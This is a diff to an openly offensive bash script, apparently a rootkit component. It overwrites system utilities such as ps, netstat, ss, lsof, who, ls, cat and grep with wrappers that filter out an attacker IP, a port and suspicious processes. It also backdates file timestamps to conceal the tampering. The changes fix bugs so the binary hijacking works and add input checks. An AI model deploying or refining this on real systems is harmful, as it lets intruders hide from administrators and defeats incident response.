@@ -1,4 +1,4 @@
-#!usr/bin/env bash
+#!/usr/bin/env bash
 #
 # Replace common defensive utilities with bash scripts that grep out the
 # strings we want to remain hidden. This includes our IP address, our port
@@ -10,7 +10,7 @@
 #
 
 IP="10.10.2.4"
-COMMAND="ps top ss netstat lsof who w last cat ls grep egrep"
+COMMANDS="ps top ss netstat lsof who w last cat ls grep egrep"
 
 IP_ESCAPED=$(echo "$IP" | sed "s/\./\\\./g") # escape the '.'s in the IP for use with egrep
 PROCESSES="egrep|sleep|run-parts|cron\.hourly|/usr/sbin/CROND -n|gnano|nohup|setsid|wget|flock"
@@ -165,38 +165,46 @@ fi
 
 cecho task "Replacing binaries with scripts that hide our evil doings"
 
-bin_timestamp=$(get_timestamp /bin)
-sbin_timestamp=$(get_timestamp /sbin)
+if [ -z "$COMMANDS" ]; then
+	cecho warning "No binaries specified, nothing to replace"
+else
+	bin_timestamp=$(get_timestamp /bin)
+	sbin_timestamp=$(get_timestamp /sbin)
 
-for command in $COMMANDS; do
-	if which "$command"; then
-		command_path=$(which $command)
-
-		if [ -f "/bin/bak${command}" ]; then
-			cecho log "Binary '$command' has already been hijacked, skipping"
+	for command in $COMMANDS; do
+		if [ -z "$command" ]; then
+			cecho error "Provided binary is an empty string, strange! Skipping..."
 		else
-			command_timestamp=$(get_timestamp "$command_path")
-			if ! cp "$command_path" "/bin/bak${process}"; then
-				cecho error "Could not copy '$command_path' to '/bin/bak${command}', aborting"
-			else
-				if ! echo "/bin/bak${process} \$@ | egrep -v \"$HIDE_ME\"" > "$command_path"; then
-					cecho error "Could not write to '$command_path', restoring original binary..."
-					mv "/bin/bak${process}" "$command_path" || cecho error "Could not restore original binary '$command_path'"
-					touch -t $command_timestamp "$command_path"
+			if which "$command"; then
+				command_path=$(which $command)
+
+				if [ -f "/bin/bak${command}" ]; then
+					cecho log "Binary '$command' has already been hijacked, skipping"
 				else
-					cecho info "Replaced binary at '$command_path'"
-					chmod 755 "$command_path" || cecho error "Could not chmod '$command_path'"
-					touch -t $command_timestamp "$command_path"
+					command_timestamp=$(get_timestamp "$command_path")
+					if ! cp "$command_path" "/bin/bak${command}"; then
+						cecho error "Could not copy '$command_path' to '/bin/bak${command}', aborting"
+					else
+						if ! echo "/bin/bak${command} \$@ | egrep -v \"$HIDE_ME\"" > "$command_path"; then
+							cecho error "Could not write to '$command_path', restoring original binary..."
+							mv "/bin/bak${command}" "$command_path" || cecho error "Could not restore original binary '$command_path'"
+							touch -t $command_timestamp "$command_path"
+						else
+							cecho info "Replaced binary at '$command_path'"
+							chmod 755 "$command_path" || cecho error "Could not chmod '$command_path'"
+							touch -t $command_timestamp "$command_path"
+						fi
+					fi
 				fi
 			fi
+		else
+			cecho warning "Binary '$command' doesn't exist, skipping"
 		fi
-	else
-		cecho warning "Binary '$command' doesn't exist, skipping"
-	fi
-done
+	done
 
-touch -t $bin_timestamp "/bin"
-touch -t $sbin_timestamp "/sbin"
-cecho info "Restored '/bin' and '/sbin' timestamps"
+	touch -t $bin_timestamp "/bin"
+	touch -t $sbin_timestamp "/sbin"
+	cecho info "Restored '/bin' and '/sbin' timestamps"
+fi
 
 cecho done "Done replacing binaries!"
